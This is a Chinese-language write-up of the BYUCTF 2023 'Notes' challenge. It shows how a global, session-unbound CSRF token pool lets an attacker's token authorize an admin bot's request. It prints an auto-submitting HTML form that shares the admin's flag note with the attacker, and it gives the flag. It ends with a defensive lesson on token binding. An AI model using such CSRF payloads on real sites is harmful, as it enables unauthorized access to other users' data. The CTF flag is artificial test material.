# BYUCTF 2023 - Notes

## 题目简述

管理员拥有 ID 固定为 32 个零的 flag 笔记。分享操作带 CSRF token，但服务只检查 token 是否存在于全局列表，不绑定用户或会话，也不在使用后删除。

## 解题过程

攻击者先注册自己的账户，在 `/share` 页面取得一个合法 token。源码把所有 token 放进全局 `csrf_tokens`，因此这个攻击者 token 也能在管理员会话中使用。

准备自动提交页面：

```html
<form action="http://127.0.0.1:1337/share" method="POST">
  <input name="note_id" value="00000000000000000000000000000000">
  <input name="user" value="attacker">
  <input name="csrf_token" value="ATTACKER_TOKEN">
</form>
<script>document.forms[0].submit()</script>
```

把该页面放到管理员 bot 可访问的 HTTPS 地址并提交给 bot。bot 已登录为 `admin`，所以 POST 在管理员会话中执行；服务确认管理员确实拥有零 ID 笔记，然后把它分享给 `attacker`。攻击者刷新笔记页即可看到：

```text
byuctf{1_thought_th4t_w4s_pretty_cl3v3r}
```

## 方法总结

CSRF token 的随机性不是唯一要求：它必须绑定具体会话/用户、具有时效，并最好单次使用。全局 token 池让任意低权限用户获得的 token 都能授权高权限会话，等价于没有身份绑定的 CSRF 防护。
